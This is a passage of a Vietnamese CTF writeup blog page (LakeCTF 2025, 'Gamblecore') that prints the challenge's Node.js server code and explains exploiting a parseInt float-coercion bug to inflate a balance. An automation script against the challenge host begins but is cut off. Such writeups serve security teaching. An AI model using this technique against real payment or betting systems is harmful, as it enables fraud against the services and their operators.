@@ -1,0 +1,383 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Writeup: LakeCTF 2025 | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup: LakeCTF 2025">
+<meta property="og:url" content="https://elliotbigfan.github.io/2025/12/01/2025/ctf/LakeCTF/wu/index.html">
+<meta property="og:site_name" content="H00d1eBl4ck">
+<meta property="og:description" content="Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/lakectf/poster.webp">
+<meta property="article:published_time" content="2025-12-01T07:09:56.000Z">
+<meta property="article:modified_time" content="2025-12-01T13:25:10.571Z">
+<meta property="article:author" content="H00d1eBl4ck">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Crypto">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/lakectf/poster.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Writeup: LakeCTF 2025",
+  "url": "https://elliotbigfan.github.io/2025/12/01/2025/ctf/LakeCTF/wu/",
+  "image": "https://elliotbigfan.github.io/img/ctf/lakectf/poster.webp",
+  "datePublished": "2025-12-01T07:09:56.000Z",
+  "dateModified": "2025-12-01T13:25:10.571Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "H00d1eBl4ck",
+      "url": "https://elliotbigfan.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2025/12/01/2025/ctf/LakeCTF/wu/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Writeup: LakeCTF 2025',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/lakectf/poster.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">Writeup: LakeCTF 2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Writeup: LakeCTF 2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-01T07:09:56.000Z" title="Created 2025-12-01 14:09:56">2025-12-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-01T13:25:10.571Z" title="Updated 2025-12-01 20:25:10">2025-12-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>16mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web-Challenge-Gamblecore"><a href="#Web-Challenge-Gamblecore" class="headerlink" title="Web | Challenge: Gamblecore"></a>Web | Challenge: Gamblecore</h1><ul>
+<li>Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt;</li>
+<li>Phân tích qua file <code>server.js</code>, file xử lý chính của challenge:</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/balance&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">coins</span>: req.<span class="property">session</span>.<span class="property">wallet</span>.<span class="property">coins</span>,</span><br><span class="line">        <span class="attr">microcoins</span>: req.<span class="property">session</span>.<span class="property">wallet</span>.<span class="property">coins</span> * <span class="number">1e6</span>,</span><br><span class="line">        <span class="attr">usd</span>: req.<span class="property">session</span>.<span class="property">wallet</span>.<span class="property">usd</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/gamble&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; currency, amount &#125; = req.<span class="property">body</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (![<span class="string">&#x27;coins&#x27;</span>, <span class="string">&#x27;usd&#x27;</span>].<span class="title function_">includes</span>(currency)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid currency&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> betAmount = <span class="built_in">parseFloat</span>(amount);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isNaN</span>(betAmount) || betAmount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid amount&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> wallet = req.<span class="property">session</span>.<span class="property">wallet</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (currency === <span class="string">&#x27;coins&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (betAmount &gt; wallet.<span class="property">coins</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Insufficient funds&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (betAmount &gt; wallet.<span class="property">usd</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Insufficient funds&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Deduct bet</span></span><br><span class="line">    <span class="keyword">if</span> (currency === <span class="string">&#x27;coins&#x27;</span>) wallet.<span class="property">coins</span> -= betAmount;</span><br><span class="line">    <span class="keyword">else</span> wallet.<span class="property">usd</span> -= betAmount;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9% chance to win</span></span><br><span class="line">    <span class="keyword">const</span> win = <span class="title function_">secureRandom</span>() &lt; <span class="number">0.09</span>;</span><br><span class="line">    <span class="keyword">let</span> winnings = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (win) &#123;</span><br><span class="line">        winnings = betAmount * <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> (currency === <span class="string">&#x27;coins&#x27;</span>) wallet.<span class="property">coins</span> += winnings;</span><br><span class="line">        <span class="keyword">else</span> wallet.<span class="property">usd</span> += winnings;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">win</span>: win,</span><br><span class="line">        <span class="attr">new_balance</span>: currency === <span class="string">&#x27;coins&#x27;</span> ? wallet.<span class="property">coins</span> : wallet.<span class="property">usd</span>,</span><br><span class="line">        <span class="attr">winnings</span>: winnings</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/convert&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; amount &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> wallet = req.<span class="property">session</span>.<span class="property">wallet</span>;</span><br><span class="line">    <span class="keyword">const</span> coinBalance = <span class="built_in">parseInt</span>(wallet.<span class="property">coins</span>);</span><br><span class="line">    amount = <span class="built_in">parseInt</span>(amount);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isNaN</span>(amount) || amount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid amount&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (amount &lt;= coinBalance &amp;&amp; amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        wallet.<span class="property">coins</span> -= amount;</span><br><span class="line">        wallet.<span class="property">usd</span> += amount * <span class="number">0.01</span>;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">`Converted <span class="subst">$&#123;amount&#125;</span> coins to $<span class="subst">$&#123;(amount * <span class="number">0.01</span>).toFixed(<span class="number">2</span>)&#125;</span>`</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Conversion failed.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">wallet</span>.<span class="property">usd</span> &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">wallet</span>.<span class="property">usd</span> -= <span class="number">10</span>;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123; <span class="attr">flag</span>: process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;EPFL&#123;fake_flag&#125;&#x27;</span> &#125;); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Not enough USD. You need $10.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/deposit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">503</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Deposit unavailable at the moment&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/withdraw&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">503</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Withdrawal unavailable at the moment&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Từ thông tin trên, ta có 6 api và tính năng của từng api:</p>
+<ul>
+<li><code>/api/balance</code>: api đưa thông tin số dư hiện tại.</li>
+<li><code>/api/gamble</code>: trò chơi gacha may rủi của challenge.</li>
+<li><code>/api/convert</code>: api hỗ trợ chuyển coins về usd.</li>
+<li><code>/api/flag</code>: api trao đổi flag khi có đủ 10$.</li>
+<li><code>/api/deposit</code>: bị disable.</li>
+<li><code>/api/withdraw</code>: bị disable.</li>
+</ul>
+</li>
+<li><p><code>/api/deposit</code> + <code>/api/withdraw</code> bị disable.</p>
+</li>
+<li><p>Vậy chỉ còn 2 API có thể thay đổi số dư:</p>
+<ul>
+<li><code>POST /api/gamble</code></li>
+<li><code>POST /api/convert</code></li>
+</ul>
+</li>
+<li><p>Nên toàn bộ bài này là chơi qua lại giữa gamble và convert.</p>
+</li>
+<li><p><strong>Phân tích hướng đi</strong>:</p>
+</li>
+<li><p>Tại <code>/api/convert</code>, ta thấy 1 đoạn này rất đáng nghi:</p>
+</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> wallet = req.<span class="property">session</span>.<span class="property">wallet</span>;</span><br><span class="line"><span class="keyword">const</span> coinBalance = <span class="built_in">parseInt</span>(wallet.<span class="property">coins</span>);</span><br><span class="line">amount = <span class="built_in">parseInt</span>(amount);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (amount &lt;= coinBalance &amp;&amp; amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    wallet.<span class="property">coins</span> -= amount;</span><br><span class="line">    wallet.<span class="property">usd</span> += amount * <span class="number">0.01</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>wallet.coins</code> là số thực rất nhỏ lúc đầu: <code>10e-6 = 0.00001</code>.</p>
+</li>
+<li><p>Trong khi đó lại dùng: <code>const coinBalance = parseInt(wallet.coins);</code>.</p>
+</li>
+<li><p>Hãy thử tự mở devtool của trình duyệt và test:</p>
+</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.00001</span>) <span class="comment">// --&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.000001</span>) <span class="comment">// --&gt; 0</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.0000008</span>) <span class="comment">// --&gt; 8</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.0000001</span>) <span class="comment">// --&gt; 1</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Sẽ có một hành vi rất “quái dị” của <code>parseInt</code> với số thực rất nhỏ.</p>
+</li>
+<li><p>Từ điều đó ta sẽ có cách để khiến <code>coinBalance</code> (int) lớn hơn rất nhiều so với <code>wallet.coins</code> thực tế.</p>
+</li>
+<li><p>Đây chính là bug.</p>
+</li>
+<li><p>Kế tiếp ta sẽ tận dụng <code>/api/gamble</code> để khiến <code>wallet.coins</code> giảm giá trị xuống bé hơn 9e-07 sau mỗi lần cược thất bại, rồi sau đó chuyển sang <code>/api/convert</code> để chuyển coins sang usd. Sau khi chuyển sang usd thành công thì lúc này <code>wallet.coins</code> sẽ âm dẫn đến việc ta không thể cược bằng coins nữa, nên ta sẽ all in tất cả usd hiện có nếu được <strong>3 lần trở đi</strong> cược thành công liên tiếp thì ta hoàn toàn có thể đủ usd và mua được flag.</p>
+</li>
+<li><p>Ví dụ: Từ <strong>$0.01 → $0.1 → $1 → $10</strong> chỉ cần 3 lần win liên tiếp (mỗi lần bet hết vốn).</p>
+</li>
+<li><p>Nếu fail thì buộc phải reset lại session và cược lại, lặp lại cho đến khi thành công thì dừng, vì tỉ lệ thắng 9% và cược không giới hạn (bằng reset session) nên hoàn toàn có khả năng xảy ra 3 lần cược thắng trở lên.</p>
+</li>
+<li><p>Dưới đây là script python dựng lại các ý tưởng trên.</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line">burp0_url = <span class="string">&quot;https://chall.polygl0ts.ch:8148&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># API</span></span><br><span class="line">api_gamble = <span class="string">&quot;/api/gamble&quot;</span></span><br><span class="line">api_convert = <span class="string">&quot;/api/convert&quot;</span></span><br><span class="line">api_balance = <span class="string">&quot;/api/balance&quot;</span></span><br><span class="line">api_flag = <span class="string">&quot;/api/flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reset session</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_session</span>():</span><br><span class="line">    url = burp0_url + api_balance</span><br><span class="line">    r = requests.get(url, headers=burp0_headers)</span><br><span class="line">    cookie = r.headers[<span class="string">&#x27;set-cookie&#x27;</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line"></span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Sec-Ch-Ua-Platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.9&quot;</span>, <span class="string">&quot;Sec-Ch-Ua&quot;</span>: <span class="string">&quot;\&quot;Chromium\&quot;;v=\&quot;139\&quot;, \&quot;Not;A=Brand\&quot;;v=\&quot;99\&quot;&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Sec-Ch-Ua-Mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://chall.polygl0ts.ch:8148&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>, 